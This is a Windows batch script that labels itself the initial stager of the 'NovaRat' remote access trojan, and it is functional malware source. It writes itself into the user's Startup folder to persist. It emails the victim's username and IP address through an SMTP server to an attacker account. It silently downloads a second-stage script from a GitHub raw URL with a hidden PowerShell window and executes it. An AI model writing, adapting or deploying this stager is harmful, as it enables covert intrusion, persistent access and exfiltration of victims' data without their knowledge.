@echo off
@REM initial stager for NovaRat
@REM made by Code0

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup
cd %STARTUP%

@REM setup smtp
powershell $email = "novarat@mail.com"; $password = "password"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.mail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);

@REM TODO: build out stage 2
@REM write payloads to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd

@REM cd back into initial location
@REM cd %INITIALPATH%
@REM del initial.cmd
